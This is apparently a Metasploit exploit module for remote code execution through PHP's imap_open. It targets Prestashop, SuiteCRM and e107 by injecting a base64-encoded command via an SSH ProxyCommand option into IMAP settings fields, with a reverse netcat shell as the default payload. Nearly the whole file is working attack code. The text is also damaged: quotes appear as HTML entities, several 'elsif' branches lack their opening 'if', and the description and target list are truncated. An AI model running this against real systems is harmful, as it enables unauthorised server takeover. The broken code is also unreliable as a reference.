# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;php imap_open Remote Code Execution&#039;,
      &#039;Description&#039;     => %q{
        IMAP session.  On Debian based systems, including Ubuntu, rsh is mapped to the ssh binary.  Ssh&#039;s ProxyCommand
        option can be passed from imap_open to execute arbitrary commands.
        While many custom applications may use imap_open, this exploit works against the following applications:
        Prestashop exploitation requires the admin URI, and administrator credentials.
        suiteCRM/e107/hostcms require administrator credentials.
      },
      &#039;Author&#039; =>
        [
          &#039;Anton Lopanitsyn&#039;, # Vulnerability discovery and PoC
          &#039;Twoster&#039;, # Vulnerability discovery and PoC
          &#039;h00die&#039; # Metasploit Module
        ],
      &#039;License&#039;         => MSF_LICENSE,
      &#039;References&#039;      =>
        [
          [ &#039;URL&#039;, &#039;https://web.archive.org/web/20181118213536/https://antichat.com/threads/463395&#039; ],
          [ &#039;URL&#039;, &#039;https://github.com/Bo0oM/PHP_imap_open_exploit&#039; ],
          [ &#039;EDB&#039;, &#039;45865&#039;]
        ],
      &#039;Privileged&#039;  => false,
      &#039;Platform&#039;  => [ &#039;unix&#039; ],
      &#039;Arch&#039;  => ARCH_CMD,
      &#039;Targets&#039; =>
        [
          [ &#039;suitecrm&#039;, {}],
          [ &#039;e107v2&#039;, {&#039;WfsDelay&#039; => 90}], # may need to wait for cron
          [ &#039;custom&#039;, {&#039;WfsDelay&#039; => 300}]
        ],
      &#039;PrependFork&#039; => true,
      &#039;DefaultOptions&#039; =>
        {
          &#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_netcat&#039;,
          &#039;WfsDelay&#039; => 120
        },
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Oct 23 2018&#039;))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, "Base directory path", &#039;/admin2769gx8k3&#039;]),
        OptString.new(&#039;USERNAME&#039;, [ false, "Username to authenticate with", &#039;&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ false, "Password to authenticate with", &#039;&#039;])
      ])
  end

  def check
      uri = normalize_uri(target_uri.path)
      res = send_request_cgi({&#039;uri&#039; => uri})
      if res && (res.code == 301 || res.code == 302)
       return CheckCode::Detected
      end
    elsif target.name =~ /suitecrm/
      #login page GET /index.php?action=Login&module=Users
      vprint_status(&#039;Loading login page&#039;)
      res = send_request_cgi(
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;vars_get&#039; => {
          &#039;action&#039; => &#039;Login&#039;,
          &#039;module&#039; => &#039;Users&#039;
        }
      )
      unless res
        print_error(&#039;Error loading site.  Check options.&#039;)
        return
      end

      if res.code = 200
        return CheckCode::Detected
      end
   end
   CheckCode::Safe
  end

  def command(spaces=&#039;$IFS$()&#039;)
    #payload is base64 encoded, and stuffed into the SSH option.
    enc_payload = Rex::Text.encode_base64(payload.encoded)
    command = "-oProxyCommand=`echo #{enc_payload}|base64 -d|bash`"
    #final payload can not contain spaces, however $IFS$() will return the space we require
    command.gsub!(&#039; &#039;, spaces)
  end

  def exploit
      uri = normalize_uri(target_uri.path)
      res = send_request_cgi({&#039;uri&#039; => uri})
      if res && res.code != 301
        print_error(&#039;Admin redirect not found, check URI.  Should be something similar to /admin2769gx8k3&#039;)
        return
      end

      #There are a bunch of redirects that happen, so we automate going through them to get to the login page.
      while res.code == 301 || res.code == 302
        cookie = res.get_cookies
        uri = res.headers[&#039;Location&#039;]
        vprint_status("Redirected to #{uri}")
        res = send_request_cgi({&#039;uri&#039; => uri})
      end

      #Tokens are generated for each URL or sub-component, we need valid ones!
      /.*token=(?<token>\w{32})/ =~ uri
      /id="redirect" value="(?<redirect>.*)"\/>/ =~ res.body
      cookie = res.get_cookies

      unless token && redirect
        print_error(&#039;Unable to find token and redirect URL, check options.&#039;)
        return
      end

      vprint_status("Token: #{token} and Login Redirect: #{redirect}")
      print_status("Logging in with #{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}")
      res = send_request_cgi(
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;cookie&#039; => cookie,
        &#039;vars_post&#039; => {
          &#039;ajax&#039; => 1,
          &#039;token&#039; => &#039;&#039;,
          &#039;controller&#039; => &#039;AdminLogin&#039;,
          &#039;submitLogin&#039; => &#039;1&#039;,
          &#039;passwd&#039; => datastore[&#039;PASSWORD&#039;],
          &#039;email&#039; => datastore[&#039;USERNAME&#039;],
          &#039;redirect&#039; => redirect
        },
        &#039;vars_get&#039; => {
          &#039;rand&#039; => &#039;1542582364810&#039; #not sure if this will hold true forever, I didn&#039;t see where it is being generated
        }
      )
      if res && res.body.include?(&#039;Invalid password&#039;)
        print_error(&#039;Invalid Login&#039;)
        return
      end
      vprint_status("Login JSON Response: #{res.body}")
      uri = JSON.parse(res.body)[&#039;redirect&#039;]
      cookie = res.get_cookies
      print_good(&#039;Login Success, loading admin dashboard to pull tokens&#039;)
      res = send_request_cgi({&#039;uri&#039; => uri, &#039;cookie&#039; => cookie})

      /AdminCustomerThreads&token=(?<token>\w{32})/ =~ res.body
      vprint_status("Customer Threads Token: #{token}")
      res = send_request_cgi({
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;cookie&#039; => cookie,
        &#039;vars_get&#039; => {
          &#039;controller&#039; => &#039;AdminCustomerThreads&#039;,
          &#039;token&#039; => token
        }
      })

      /form method="post" action="index\.php\?controller=AdminCustomerThreads&token=(?<token>\w{32})/ =~ res.body
      print_good("Sending Payload with Final Token: #{token}")
      data = Rex::MIME::Message.new
      data.add_part(&#039;1&#039;, nil, nil, &#039;form-data; name="PS_CUSTOMER_SERVICE_FILE_UPLOAD"&#039;)
      data.add_part("Dear Customer,\n\nRegards,\nCustomer service", nil, nil, &#039;form-data; name="PS_CUSTOMER_SERVICE_SIGNATURE_1"&#039;)
      data.add_part("x #{command}}", nil, nil, &#039;form-data; name="PS_SAV_IMAP_URL"&#039;)
      data.add_part(&#039;143&#039;, nil, nil, &#039;form-data; name="PS_SAV_IMAP_PORT"&#039;)
      data.add_part(Rex::Text.rand_text_alphanumeric(8), nil, nil, &#039;form-data; name="PS_SAV_IMAP_USER"&#039;)
      data.add_part(Rex::Text.rand_text_alphanumeric(8), nil, nil, &#039;form-data; name="PS_SAV_IMAP_PWD"&#039;)
      data.add_part(&#039;0&#039;, nil, nil, &#039;form-data; name="PS_SAV_IMAP_DELETE_MSG"&#039;)
      data.add_part(&#039;0&#039;, nil, nil, &#039;form-data; name="PS_SAV_IMAP_CREATE_THREADS"&#039;)
      data.add_part(&#039;0&#039;, nil, nil, &#039;form-data; name="PS_SAV_IMAP_OPT_POP3"&#039;)
      data.add_part(&#039;0&#039;, nil, nil, &#039;form-data; name="PS_SAV_IMAP_OPT_NORSH"&#039;)
      data.add_part(&#039;0&#039;, nil, nil, &#039;form-data; name="PS_SAV_IMAP_OPT_SSL"&#039;)
      data.add_part(&#039;0&#039;, nil, nil, &#039;form-data; name="PS_SAV_IMAP_OPT_VALIDATE-CERT"&#039;)
      data.add_part(&#039;0&#039;, nil, nil, &#039;form-data; name="PS_SAV_IMAP_OPT_NOVALIDATE-CERT"&#039;)
      data.add_part(&#039;0&#039;, nil, nil, &#039;form-data; name="PS_SAV_IMAP_OPT_TLS"&#039;)
      data.add_part(&#039;0&#039;, nil, nil, &#039;form-data; name="PS_SAV_IMAP_OPT_NOTLS"&#039;)
      data.add_part(&#039;&#039;, nil, nil, &#039;form-data; name="submitOptionscustomer_thread"&#039;)

      send_request_cgi(
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;ctype&#039;  => "multipart/form-data; boundary=#{data.bound}",
        &#039;data&#039;   => data.to_s,
        &#039;cookie&#039; => cookie,
        &#039;vars_get&#039; => {
          &#039;controller&#039; => &#039;AdminCustomerThreads&#039;,
          &#039;token&#039; => token
        }
      )
      print_status(&#039;IMAP server change left on server, manual revert required.&#039;)

      if res && res.body.include?(&#039;imap Is Not Installed On This Server&#039;)
        print_error(&#039;PHP IMAP mod not installed/enabled &#039;)
      end
    elsif target.name =~ /suitecrm/
      #login page GET /index.php?action=Login&module=Users
      vprint_status(&#039;Loading login page&#039;)
      res = send_request_cgi(
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;vars_get&#039; => {
          &#039;action&#039; => &#039;Login&#039;,
          &#039;module&#039; => &#039;Users&#039;
        }
      )
      unless res
        print_error(&#039;Error loading site.  Check options.&#039;)
        return
      end

      if res.code = 200
        cookie = res.get_cookies
      else
        print_error("HTTP code #{res.code} found, check options.")
        return
      end

      vprint_status("Logging in as #{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}")
      res = send_request_cgi(
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;cookie&#039; => cookie,
        &#039;vars_post&#039; => {
          &#039;module&#039; => &#039;Users&#039;,
          &#039;action&#039; => &#039;Authenticate&#039;,
          &#039;return_module&#039; => &#039;Users&#039;,
          &#039;return_action&#039; => &#039;Login&#039;,
          &#039;cant_login&#039; => &#039;&#039;,
          &#039;login_module&#039; => &#039;&#039;,
          &#039;login_action&#039; => &#039;&#039;,
          &#039;login_record&#039; => &#039;&#039;,
          &#039;login_token&#039; => &#039;&#039;,
          &#039;login_oauth_token&#039; => &#039;&#039;,
          &#039;login_mobile&#039; => &#039;&#039;,
          &#039;user_name&#039; => datastore[&#039;USERNAME&#039;],
          &#039;username_password&#039; => datastore[&#039;PASSWORD&#039;],
          &#039;Login&#039; => &#039;Log+In&#039;
        }
      )
      unless res
        print_error(&#039;Error loading site.  Check options.&#039;)
        return
      end

      if res.code = 302
        cookie = res.get_cookies
        print_good(&#039;Login Success&#039;)
      else
        print_error(&#039;Failed Login, check options.&#039;)
      end

      #load the email settings page to get the group_id
      vprint_status(&#039;Loading InboundEmail page&#039;)
      res = send_request_cgi(
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;cookie&#039; => cookie,
        &#039;vars_get&#039; => {
          &#039;module&#039; => &#039;InboundEmail&#039;,
          &#039;action&#039; => &#039;EditView&#039;
        }
      )

      unless res
        print_error(&#039;Error loading site.&#039;)
        return
      end

      /"group_id" value="(?<group_id>\w{8}-\w{4}-\w{4}-\w{4}-\w{12})">/ =~ res.body

      unless group_id
        print_error(&#039;Could not identify group_id from form page&#039;)
        return
      end

      print_good("Sending payload with group_id #{group_id}")

      referer = "http://#{datastore[&#039;RHOST&#039;]}#{normalize_uri(target_uri.path, &#039;index.php&#039;)}?module=InboundEmail&action=EditView"
      res = send_request_cgi(
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;cookie&#039; => cookie,
        &#039;headers&#039; => { &#039;Referer&#039; => referer},
        &#039;vars_post&#039; => {
          &#039;module&#039; => &#039;InboundEmail&#039;,
          &#039;record&#039; => &#039;&#039;,
          &#039;origin_id&#039; => &#039;&#039;,
          &#039;isDuplicate&#039; => &#039;false&#039;,
          &#039;action&#039; => &#039;Save&#039;,
          &#039;group_id&#039; => group_id,
          &#039;return_module&#039; => &#039;&#039;,
          &#039;return_action&#039; => &#039;&#039;,
          &#039;return_id&#039; => &#039;&#039;,
          &#039;personal&#039; => &#039;&#039;,
          &#039;searchField&#039; => &#039;&#039;,
          &#039;mailbox_type&#039; => &#039;&#039;,
          &#039;button&#039; => &#039;  Save  &#039;,
          &#039;name&#039; => Rex::Text.rand_text_alphanumeric(8),
          &#039;status&#039; => &#039;Active&#039;,
          &#039;server_url&#039; => "x #{command}}",
          &#039;email_user&#039; => Rex::Text.rand_text_alphanumeric(8),
          &#039;protocol&#039; => &#039;imap&#039;,
          &#039;email_password&#039; => Rex::Text.rand_text_alphanumeric(8),
          &#039;port&#039; => &#039;143&#039;,
          &#039;mailbox&#039; => &#039;INBOX&#039;,
          &#039;trashFolder&#039; => &#039;TRASH&#039;,
          &#039;sentFolder&#039; => &#039;&#039;,
          &#039;from_name&#039; => Rex::Text.rand_text_alphanumeric(8),
          &#039;is_auto_import&#039; => &#039;on&#039;,
          &#039;from_addr&#039; => "#{Rex::Text.rand_text_alphanumeric(8)}@#{Rex::Text.rand_text_alphanumeric(8)}.org",
          &#039;reply_to_name&#039; => &#039;&#039;,
          &#039;distrib_method&#039; => &#039;AOPDefault&#039;,
          &#039;distribution_user_name&#039; => &#039;&#039;,
          &#039;distribution_user_id&#039; => &#039;&#039;,
          &#039;distribution_options[0]&#039; => &#039;all&#039;,
          &#039;distribution_options[1]&#039; => &#039;&#039;,
          &#039;distribution_options[2]&#039; => &#039;&#039;,
          &#039;create_case_template_id&#039; => &#039;&#039;,
          &#039;reply_to_addr&#039; => &#039;&#039;,
          &#039;template_id&#039; => &#039;&#039;,
          &#039;filter_domain&#039; => &#039;&#039;,
          &#039;email_num_autoreplies_24_hours&#039; => &#039;10&#039;,
          &#039;leaveMessagesOnMailServer&#039; => &#039;1&#039;
        }
      )
      if res && res.code == 200
        print_error(&#039;Triggered CSRF protection, may try exploitation manually.&#039;)
      end
      print_status(&#039;IMAP server config left on server, manual removal required.&#039;)
    elsif target.name =~ /e107v2/
      # \t also became /t, however "\t" does seem to work.

      # e107 also uses a cron job to check bounce jobs, which may not be active.
      # either cron can be disabled, or bounce checks disabled, so we try to
      # kick the process manually, however if it doesn&#039;t work we&#039;ll hope
      # cron is running and we get a call back anyways.

      vprint_status("Logging in as #{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}")
      res = send_request_cgi(
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;e107_admin&#039;, &#039;admin.php&#039;),
        &#039;vars_post&#039; => {
          &#039;authname&#039; => datastore[&#039;USERNAME&#039;],
          &#039;authpass&#039; => datastore[&#039;PASSWORD&#039;],
          &#039;authsubmit&#039; => &#039;Log In&#039;
      })
      unless res
        print_error(&#039;Error loading site.  Check options.&#039;)
        return
      end

      if res.code == 302
        cookie = res.get_cookies
        print_good(&#039;Login Success&#039;)
      else
        print_error(&#039;Failed Login, check options.&#039;)
      end


      vprint_status(&#039;Checking if Cron is enabled for triggering&#039;)
      res = send_request_cgi(
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;e107_admin&#039;, &#039;cron.php&#039;),
        &#039;cookie&#039; => cookie
      )
      unless res
        print_error(&#039;Error loading site.  Check options.&#039;)
        return
      end
      if res.body.include? &#039;Status: <b>Disabled</b>&#039;
        print_error(&#039;Cron disabled, unexploitable.&#039;)
        return
      end

      print_good(&#039;Storing payload in mail settings&#039;)

      # the imap/pop field is hard to find. Check Users > Mail
      # then check "Bounced emails - Processing method" and set it to "Mail account"
      send_request_cgi(
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;e107_admin&#039;, &#039;mailout.php&#039;),
        &#039;cookie&#039; => cookie,
        &#039;vars_get&#039; => {
        },
        &#039;vars_post&#039; => {
          &#039;testaddress&#039; => &#039;none@none.com&#039;,
          &#039;testtemplate&#039; => &#039;textonly&#039;,
          &#039;bulkmailer&#039; => &#039;smtp&#039;,
          &#039;smtp_server&#039; => &#039;1.1.1.1&#039;,
          &#039;smtp_username&#039; => &#039;username&#039;,
          &#039;smtp_password&#039; => &#039;password&#039;,
          &#039;smtp_port&#039; => &#039;25&#039;,
          &#039;smtp_options&#039; => &#039;&#039;,
          &#039;smtp_keepalive&#039; => &#039;0&#039;,
          &#039;smtp_useVERP&#039; => &#039;0&#039;,
          &#039;mail_sendstyle&#039; => &#039;texthtml&#039;,
          &#039;mail_pause&#039; => &#039;3&#039;,
          &#039;mail_pausetime&#039; => &#039;4&#039;,
          &#039;mail_workpertick&#039; => &#039;5&#039;,
          &#039;mail_log_option&#039; => &#039;0&#039;,
          &#039;mail_bounce&#039; => &#039;mail&#039;,
          &#039;mail_bounce_email2&#039; => &#039;&#039;,
          &#039;mail_bounce_email&#039; => "#{Rex::Text.rand_text_alphanumeric(8)}@#{Rex::Text.rand_text_alphanumeric(8)}.org",
          &#039;mail_bounce_pop3&#039; => "x #{command("\t")}}",
          &#039;mail_bounce_user&#039; => Rex::Text.rand_text_alphanumeric(8),
          &#039;mail_bounce_pass&#039; => Rex::Text.rand_text_alphanumeric(8),
          &#039;mail_bounce_type&#039; => &#039;imap&#039;,
          &#039;mail_bounce_auto&#039; => &#039;1&#039;,
      })


      vprint_status(&#039;Loading cron page to execute job manually&#039;)
      res =  send_request_cgi(
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;e107_admin&#039;, &#039;cron.php&#039;),
        &#039;cookie&#039; => cookie
      )

      unless res
        print_error(&#039;Error loading site.  Check options.&#039;)
        return
      end

      if /name=&#039;e-token&#039; value=&#039;(?<etoken>\w{32})&#039;/ =~ res.body && /_system::procEmailBounce.+?cron_execute\[(?<cron_id>\d)\]/m =~ res.body
        print_good("Triggering manual run of mail bounch check cron to execute payload with cron id #{cron_id} and etoken #{etoken}")
        # The post request has several duplicate columns, however all were not required.  Left them commented for documentation purposes
        send_request_cgi(
          &#039;method&#039; => &#039;POST&#039;,
          &#039;uri&#039; => normalize_uri(target_uri.path, &#039;e107_admin&#039;, &#039;cron.php&#039;),
          &#039;cookie&#039; => cookie,
          &#039;vars_post&#039; => {
            &#039;e-token&#039; => etoken,
            #&#039;e-columns[]&#039; => &#039;cron_category&#039;,
            &#039;e-columns[]&#039; => &#039;cron_name&#039;,
            #&#039;e-columns[]&#039; => &#039;cron_description&#039;,
            #&#039;e-columns[]&#039; => &#039;cron_function&#039;,
            #&#039;e-columns[]&#039; => &#039;cron_tab&#039;,
            #&#039;e-columns[]&#039; => &#039;cron_lastrun&#039;,
            #&#039;e-columns[]&#039; => &#039;cron_active&#039;,
            "cron_execute[#{cron_id}]" => &#039;1&#039;,
            &#039;etrigger_batch&#039; => &#039;&#039;
        })

      else
        print_error(&#039;e-token not found, required for manual exploitation.  Wait 60sec, cron may still trigger.&#039;)
      end

      print_status(&#039;IMAP server config left on server, manual removal required.&#039;)
    elsif target.name =~ /custom/
      print_status(&#039;Listener started for 300 seconds&#039;)
      print_good("POST request connection string: x #{command}}")
      # URI.encode leaves + as + since that&#039;s a space encoded.  So we manually change it.
      print_good("GET request connection string: #{URI.encode("x " + command + "}").sub! &#039;+&#039;, &#039;%2B&#039;}")
    end
  end
end

